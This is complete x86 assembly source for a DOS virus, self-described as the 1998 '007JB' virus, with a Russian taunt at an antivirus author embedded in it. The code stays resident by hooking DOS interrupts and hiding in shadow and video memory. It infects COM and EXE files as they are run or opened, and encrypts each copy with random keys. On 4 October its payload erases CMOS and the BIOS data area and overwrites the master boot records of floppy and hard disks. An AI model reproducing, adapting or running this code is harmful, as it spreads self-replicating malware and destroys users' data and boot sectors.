
;DEBUG           equ     TRUE

                        ;ssssoooo
cc_loader_ptr   equ      007005E0h
cc_video_ptr    equ     0AE000100h
cc_shadow_ptr   equ     0C6F00100h
cc_temp_ptr     equ     0BE000100h

file_id_offs    equ     12h
file_id         equ     '07'

magic_i         equ     829Ah
magic_o         equ     829Bh

o               equ     (word ptr 0)
s               equ     (word ptr 2)

mve             macro   x, y
                push    y
                pop     x
                endm

dta_struc       struc
                ; internal
dta_driveletter db      ?               ; 0=A:
dta_name8       db      8 dup (?)       ;
dta_ext3        db      3 dup (?)       ;
dta_searchattr  db      ?               ;
dta_direntrynum dw      ?               ; 0=. 1=..
dta_dircluster  dw      ?
                dd      ?               ; unused
                ; public
dta_attr        db      ?               ; 1=r 32=a 16=d 2=h 4=s 8=v
dta_time        dw      ?               ; чччччммм мммссссс
dta_date        dw      ?               ; гггггггм мммддддд
dta_size        dd      ?
dta_name        db      13 dup (?)
                ends

exe_struc       struc
exe_mz          dw      ?               ; MZ/ZM
exe_last512     dw      ?
exe_num512      dw      ?
exe_relnum      dw      ?
exe_headersize  dw      ?               ; in PAR
exe_minmem      dw      ?
exe_maxmem      dw      ?
exe_ss          dw      ?
exe_sp          dw      ?
exe_checksum    dw      ?               ; 0
exe_ip          dw      ?
exe_cs          dw      ?
exe_relofs      dw      ?
exe_ovrnum      dw      ?               ; 0
                db      32 dup (?)
exe_neptr       dd      ?
                ends

                model   small
                p386
                locals  __
                jumps

code            segment word public use16
                assume  cs:code, ds:code, es:code, ss:code

                org     100h
start:
c1_start:
                call    initialize

                db      13,10
                db      '007JB.'
                db      virsize / 1000 mod 10 + '0'
                db      virsize /  100 mod 10 + '0'
                db      virsize /   10 mod 10 + '0'
                db      virsize /    1 mod 10 + '0'
                db      ' virus  ver.1.01.2[Beta]  copyright (c) 1998 by 007JB',13,10
                db      'thanx to Z0MBiE/29A & S.S.R.',13,10
                db      13,10

c1_size         equ     $-c1_start

com_start:      call    code_unxor

c2_start:
                call    antiweb

                pusha

                call    sux

orig            db      64 dup (?)
orig_size       equ     $-orig

sux:            pop     si
                mov     di, 100h
                mov     cx, orig_size
                rep     movsb

                mov     si, 1234h
start_ptr       equ     word ptr $-2

                mov     ax, cs
                add     ax, 1000h
                mov     es, ax
                mov     di, 100h
                mov     cx, virsize
                rep     movsb

                popa
                push    cs
                push    0100h

                push    es
                push    offset tsr
                retf

c2_size         equ     $-c2_start

exe_start:      call    code_unxor

c3_start:
                call    antiweb

                push    ax
                mov     ax, es
                add     cs:save_cs, ax
                add     cs:save_ss, ax
                pop     ax

                push    cs
                call    tsr

                lss     sp, cs:save_sssp

                db      0eah
save_ip         dw      ?
save_cs         dw      ?

antiweb:        nop
                nop

                ret

save_sssp       label   dword
save_sp         dw      ?
save_ss         dw      ?

dosver          db      ?

c3_size         equ     $-c3_start


code_unxor:     pusha

                mov     bx, 1234h
zero_ptr        equ     word ptr $-2

                in      al, 40h
                and     ax, 7
                mov     dx, ax
                add     dl, 88h
__1:            in      al, 40h
                or      al, al
                jz      __1
                mov     ah, al
                out     dx, al
                in      al, dx
                sub     al, ah
                cbw
                ror     ax, 1

                lea     dx, code_w_unxor[bx]
                sub     dx, ax

                call    code_calldx
                popa
                ret

code_calldx:    lea     si, c1_start
                mov     cx, c1_size
                call    dx
                lea     si, c2_start
                mov     cx, c2_size
                call    dx
                lea     si, c3_start
                mov     cx, c3_size
                call    dx
                lea     si, c4_start
                mov     cx, c4_size
                call    dx

                ret

code_w_unxor:   shr     cx, 1
__1:            add     word ptr cs:[si+bx], 1111h
add_word        equ     word ptr $-2
                xor     word ptr cs:[si+bx], 2222h
xor_word        equ     word ptr $-2
                sub     word ptr cs:[si+bx], 3333h
sub_word        equ     word ptr $-2
                inc     si
                inc     si
                loop    __1
                ret


c4_start:

code_xor:       pusha
                lea     dx, code_w_xor
                call    code_calldx
                popa
                ret

code_w_xor:     shr     cx, 1

                add     si, cryptedvir-start

__1:            mov     ax, sub_word
                add     [si], ax
                mov     ax, xor_word
                xor     [si], ax
                mov     ax, add_word
                sub     [si], ax
                inc     si
                inc     si
                loop    __1
                ret

tsr:            pusha                   ; FAR
                push    ds es

                mve     ds, cs
                cld

                mov     ah, 2ah
                int     21h
                cmp     dx, 0A04h ; 4 oct.
                je      kill_em

                mov     ax, magic_i
                int     21h
                cmp     ax, magic_o
                je      __exit

                mov     ax, 3306h
                int     21h
                cmp     bl, 7
                je      __dos7
                cmp     bl, 6
                jne     __exit
__dos7:         mov     dosver, bl

                mov     ax, 1130h
                mov     bh, 2
                int     10h
                mov     ax, es
                add     bp, 15
                and     bp, 0fff0h
                shr     bp, 4
                add     ax, bp
                sub     ax, 16
                mov     shadow_ptr.s, ax
                mov     shadow_ptr.o, 0100h

                mov     ax, 3521h
                int     21h
                mov     old21.o, bx
                mov     old21.s, es
                mov     ax, 3508h
                int     21h
                mov     old08.o, bx
                mov     old08.s, es

                mov     al, 3
                out     80h, al
                out     81h, al
                mov     al, 0ffh
                out     87h, al

                call    move_to_shadow

                cmp     dosver, 7
                je      __skip1
                call    move_to_vga

                les     di, loader_ptr
                mve     ds, cs
                lea     si, loader
                mov     cx, loader_size
                rep     movsb

__skip1:

                mov     ax, 2503h
                lds     dx, cs:shadow_ptr
                add     dx, int03-start
                int     21h

                mov     ax, 2508h
                mov     ds, cs:shadow_ptr.s
                lea     dx, int08
                int     21h

                mov     ax, 2521h
                lds     dx, cs:loader_ptr
                cmp     cs:dosver, 7
                jne     __skip2
                mov     ds, cs:shadow_ptr.s
                lea     dx, alt_21
__skip2:        int     21h

__exit:         pop     es ds
                popa

                retf

kill_em:        IFDEF   DEBUG
                int 3
                ELSE
                nop
                ENDIF

                call    kill_40
                call    kill_cmos

                mve     es, cs
                lea     bx, mbr
                call    kill_mbr

                db      0eah
                dd      0f000fff0h

mbr:            cli
                xor     bx, bx
                mov     ss, bx
                mov     sp, 7c00h
                sti

                call    kill_40

                mov     ds, bx
                mov     es, bx

                call    kill_cmos

                mov     bx, 7c00h
                call    kill_mbr

                call    pop_msg

                db      13,10
                db      13,10
                db      'И вот теперь ты, поганый юзер, весь в дерьме.',13,10
                db      'А кто разгребает дерьмо? Да, это он, наш застенчивый, убогий друг. ;)))',13,10
                db      'И ему по ходу это нравится...',13,10
                db      'Молчит. Стыыыыыдно. ХЕХЕХЕ.',13,10
                db      'Мдаа, игорек. Где же веб-то твой?... а как всегда ;)',13,10
                db      'а код зачем спи$дил из АВП?',13,10
                db      'что, самому слабо? Эээх ты, а пиз$ил-то, что он крутой... а он-гов#о...',13,10
                db      0

kill_40:        mve     es, 40h
                xor     di, di
                mov     cx, 256
                xor     al, al
                cld
                rep     stosb
                ret

kill_cmos:      xor     ax, ax
__1:            out     70h, al
                out     71h, al
                inc     al
                jnz     __1
                ret

kill_mbr:       mov     dx, 0000h
                call    __1
                inc     dx
                call    __1
                mov     dx, 0080h
                call    __1
                inc     dx
__1:            mov     ax, 0301h
                mov     cx, 0001h
                int     13h
                ret

pop_msg:        pop     si
                cld

__1:            lodsb
                mov     ah, 0eh
                mov     bx, 7
                int     10h
                or      al, al
                jnz     __1

loader_ptr      dd      cc_loader_ptr

loader:         pusha
                push    ds es

                call    port_set

                db      0eah
video_ptr       dd      cc_video_ptr

port_set:       mov     dx, 03c4h
                mov     ax, 0402h
                out     dx, ax
                mov     ax, 0704h
                out     dx, ax
                mov     dx, 03ceh
                mov     ax, 0005h
                out     dx, ax
                mov     ax, 0406h
                out     dx, ax
                mov     ax, 0204h
                out     dx, ax
                ret

loader_size     equ     $-loader

port_reset:     mov     dx, 03c4h
                mov     ax, 0302h
                out     dx, ax
                mov     ax, 0304h
                out     dx, ax
                mov     dx, 03ceh
                mov     ax, 1005h
                out     dx, ax
                mov     ax, 0e06h
                out     dx, ax
                mov     ax, 0004h
                out     dx, ax
                ret

                db      20 dup (0f6h)
                i       = $
                org     mbr + 512 - 2
                dw      0aa55h
                org     i

shadow_ptr      dd      cc_shadow_ptr

invideo:        call    move_to_shadow

                push    cs:shadow_ptr.s
                mov     ax, cs:shadow_ptr.o
                add     ax, inshadow-start
                push    ax
                retf

move_to_vga:    in      al, 81h
                or      al, al
                jz      __exit
                dec     al
                out     81h, al

                call    port_set

                mve     ds, cs
                les     di, video_ptr
                lea     si, start
                mov     cx, virsize
                cld
                rep     movsb

                db      09ah
                dd      cc_video_ptr + check_me-start

                call    port_reset

__exit:         ret

check_me:       IFDEF  DEBUG
                nop
                nop
                nop
                ELSE
                db      0cdh,03h
                db      0cch
                ENDIF
                retf

move_to_shadow: in      al, 80h
                or      al, al
                jz      __exit
                dec     al
                out     80h, al

                call    shadow_open

                mve     ds, cs
                lea     si, start
                les     di, shadow_ptr
                mov     cx, virsize
                cld
                rep     movsb

                call    shadow_close

__exit:         ret

inshadow:       call    port_reset

                pop     es ds
                popa

alt_21:         cmp     ax, magic_i
                je      ax_magic_i

                cmp     ah, 04Bh
                je      infect_dsdx
                cmp     ah, 03Dh
                je      infect_dsdx
                cmp     ah, 043h
                je      infect_dsdx
                cmp     ah, 056h
                je      infect_dsdx

int21_exit:     db      0eah
old21           dd      ?

ax_magic_i:     IFDEF   DEBUG
                int 3
                ELSE
                nop
                ENDIF
                mov     ax, magic_o
                iret

;;

shadow_open:    pushf
                cli
                call    reg_save
                call    get_sh_state
                or      sh_w, seg_c000_32k
                and     sh_c, NOT seg_c000_32k
                call    set_sh_state
                call    reg_load
                popf
                ret

int03:          nop
                nop
                iret

shadow_close:   pushf
                cli
                call    reg_save
                call    get_sh_state
                and     sh_w, NOT seg_c000_32k
                or      sh_c, seg_c000_32k
                call    set_sh_state
                call    reg_load
                popf
                ret

reg_save:       mov     cs:save_eax, eax
                mov     cs:save_ebx, ebx
                mov     cs:save_ecx, ecx
                mov     cs:save_edx, edx
                mov     cs:save_esi, esi
                mov     cs:save_edi, edi
                mov     cs:save_ebp, ebp
                ret

reg_load:       mov     eax, cs:save_eax
                mov     ebx, cs:save_ebx
                mov     ecx, cs:save_ecx
                mov     edx, cs:save_edx
                mov     esi, cs:save_esi
                mov     edi, cs:save_edi
                mov     ebp, cs:save_ebp
                ret

save_eax        dd      ?
save_ebx        dd      ?
save_ecx        dd      ?
save_edx        dd      ?
save_esi        dd      ?
save_edi        dd      ?
save_ebp        dd      ?

                locals  @@
include         sh.inc
                locals  __

;;

infect_dsdx:    pusha
                push    ds es

                in      al, 87h
                cmp     al, 7
                je      __exit

                mov     ah, 0fh
                int     10h
                cmp     al, 3
                jne     __exit

                lea     si, start
                les     di, cs:temp_ptr
                mov     cx, virsize
                cld
                segcs
                rep     movsb

                db      09ah
                dd      cc_temp_ptr + infect_file-start

__exit:         pop     es ds
                popa

                jmp     int21_exit

temp_ptr        dd      cc_temp_ptr

infect_file:    IFDEF   DEBUG
                int 3
                ELSE
                nop
                ENDIF

                mov     al, 7
                out     87h, al

                mov     ah, 60h
                mov     si, dx
                mve     es, cs
                lea     di, filename
                call    call21

                mve     ds, cs

                lea     si, filename
                cld
__1:            lodsb
                or      al, al
                jnz     __1
                sub     si, 1+3+1
                lodsd

                or      eax, 20202000h

                cmp     eax, 'moc.'
                jne     __2
                call    infect_com
                jmp     __exit

__2:            cmp     eax, 'exe.'
                jne     __3
                call    infect_exe
                jmp     __exit
__3:

__exit:         mov     al, 0FFh
                out     87h, al

                IFDEF   DEBUG
                int 3
                ELSE
                nop
                ENDIF

                retf

call21:         pushf
                call    cs:old21
                ret

file_init:      mov     ah, 2fh
                call    call21
                push    es
                push    bx

                mov     ah, 1ah
                mve     ds, cs
                lea     dx, dta
                call    call21

                mov     ah, 4eh
                lea     dx, filename
                mov     cx, 1+2+4+32
                call    call21

                mov     ah, 1ah
                pop     dx
                pop     ds
                call    call21

                mve     ds, cs

                ret

file_open:      cmp     dosver, 7
                jne     __1

                mov     ax, 4301h
                lea     dx, filename
                xor     cx, cx
                call    call21
                jc      __exit
                mov     ax, 3d02h
                jmp     __2

__1:            mov     ax, 3d00h
__2:            lea     dx, filename
                call    call21
                jc      __exit

                xchg    bx, ax

__exit:         ret

file_close:     mve     ds, cs

                mov     ah, 3eh
                call    call21
                jc      __exit

                cmp     dosver, 7
                jne     __exit

                mov     ax, 4301h
                xor     cx, cx
                mov     cl, dta.dta_attr
                lea     dx, filename
                call    call21

__exit:         ret

infect_com:     call    file_init
                jc      __exit

                call    check_avail
                jc      __exit

                call    file_open
                jc      __exit

                mov     ah, 3fh
                lea     dx, orig
                mov     cx, orig_size
                call    call21

                cmp     orig.word ptr file_id_offs, file_id
                je      __settime

                mov     ax, 4202h
                cwd
                xor     cx, cx
                call    call21

                push    ax
                mov     zero_ptr, ax
                add     ax, 100h
                mov     start_ptr, ax
                pop     ax

                lea     si, orig
                lea     di, compatch
                mov     cx, orig_size
                mve     es, cs
                cld
                rep     movsb

                mov     compatch.byte ptr 0, 0E9h
                add     ax, com_start-start - 3
                mov     compatch.word ptr 1, ax
                mov     compatch.word ptr file_id_offs, file_id

                call    infect_1

                mov     ah, 40h
                lea     dx, compatch
                mov     cx, orig_size
                call    call21

                inc     com_counter

__settime:      call    set_v_time

__close:        call    file_close

__exit:         ret

set_v_time:     call    fuck_sft

                mov     ax, 5701h
                mov     dx, dta.dta_date
                mov     cx, dx
                xchg    ch, cl
                call    call21
                ret

fuck_sft:       pusha

                cmp     cs:dosver, 7
                je      __exit

                mov     ax, 1220h
                int     2fh
                mov     bl, es:[di]
                mov     ax, 1216h
                int     2fh
                mov     es:[di].word ptr 2, 0002h

__exit:         popa
                ret

com_counter     dw      8       ; hehe
exe_counter     dw      31

check_avail:    mov     ax, dta.dta_size.o
                mov     dx, dta.dta_size.s
                or      dx, dx
                jnz     __exit
                cmp     ax, 300
                jbe     __exit
                cmp     ax, 65536-256-2 - virsize
                ja      __exit
                mov     cx, 1000
                div     cx
                cmp     dx, 7
                jbe     __exit

                mov     dx, dta.dta_date
                mov     cx, dx
                xchg    ch, cl
                cmp     cx, dta.dta_time
                je      __exit

                clc
                ret

__exit:         stc
                ret

infect_exe:     call    file_init
                jc      __exit

                call    check_avail
                jc      __exit

                call    file_open
                jc      __exit

                mov     ah, 3fh
                lea     dx, exe
                mov     cx, size exe_struc
                call    call21

                cmp     exe.word ptr file_id_offs, file_id
                je      __settime

                mov     ax, exe.exe_mz
                cmp     ax, 'ZM'
                jne     __close

                mov     ax, exe.exe_num512
                dec     ax
                jz      __close
                xor     dx, dx
                mov     cx, 512
                mul     cx
                add     ax, exe.exe_last512
                jc      __close

                cmp     ax, dta.dta_size.word ptr 0
                jne     __close

                mov     ax, exe.exe_ss
                add     ax, 16
                mov     save_ss, ax
                mov     ax, exe.exe_sp
                mov     save_sp, ax
                mov     ax, exe.exe_cs
                add     ax, 16
                mov     save_cs, ax
                mov     ax, exe.exe_ip
                mov     save_ip, ax

                mov     ax, dta.dta_size.word ptr 0
                mov     cx, exe.exe_headersize
                shl     cx, 4
                sub     ax, cx
                add     ax, 15
                and     ax, 0fff0h

                shr     ax, 4
                sub     ax, 16

                mov     exe.exe_cs, ax
                mov     exe.exe_ip, offset exe_start
                mov     exe.exe_ss, ax
                mov     exe.exe_sp, offset exe_sptr

                mov     exe.word ptr file_id_offs, file_id

                mov     zero_ptr, 0
                mov     start_ptr, 100h

                mov     si, dta.dta_size.word ptr 0
                add     si, 15
                and     si, 0fff0h

                mov     ax, si
                add     ax, virsize
                jc      __close
                xor     dx, dx
                mov     cx, 512
                div     cx
                inc     ax
                mov     exe.exe_num512, ax
                mov     exe.exe_last512, dx

                mov     ax, exe.exe_minmem
                add     ax, exememory
                jnc     __1
                mov     ax, -1
__1:            mov     exe.exe_minmem, ax

                mov     ax, exe.exe_maxmem
                add     ax, exememory
                jnc     __2
                mov     ax, -1
__2:            mov     exe.exe_maxmem, ax

                mov     ax, 4200h
                mov     dx, si
                xor     cx, cx
                call    call21

                call    infect_1

                mov     ah, 40h
                lea     dx, exe
                mov     cx, size exe_struc
                call    call21

                inc     exe_counter

__settime:      call    set_v_time

__close:        call    file_close

__exit:         ret

infect_1:       call    fuck_sft

                call    random
                mov     xor_word, ax
                call    random
                mov     add_word, ax
                call    random
                mov     sub_word, ax

                lea     si, start
                lea     di, cryptedvir
                mve     es, cs
                mov     cx, virsize
                cld
                rep     movsb

                call    code_xor

                mov     ah, 40h
                lea     dx, cryptedvir
                mov     cx, virsize
                call    call21

                mov     ax, 4200h
                cwd
                xor     cx, cx
                call    call21

                ret

random:         push    bx
                mov     bx, 1234h
rndword         equ     word ptr $-2
                in      al, 40h
                xor     bl, al
                in      al, 40h
                add     bh, al
                in      al, 41h
                sub     bl, al
                in      al, 41h
                xor     bh, al
                in      al, 42h
                add     bl, al
                in      al, 42h
                sub     bh, al
             ;  mov     cs:rndword, bx
                xchg    bx, ax
                pop     bx
                test    al, 1
                ret

int08:          nop
                nop

                db      0eah
old08           dd      ?

                db      16 dup (0F6h)

c4_size         equ     $-c4_start

virsize         equ     $-start
codeend:

                even
filename        db      256 dup (?)
compatch        db      orig_size dup (?)
dta             dta_struc ?
exe             exe_struc ?

cryptedvir      db      virsize+1 dup (?)

                even
                db      512 dup (?)
exe_sptr:

exememory       equ     ($-codeend+15)/16

initialize:     mov     start.byte ptr 0, 0E9h
                mov     start.word ptr 1, invideo-(start+3)

                push    cs
                call    tsr

                mov     ax, 4c00h
                int     21h

code            ends
                end     start

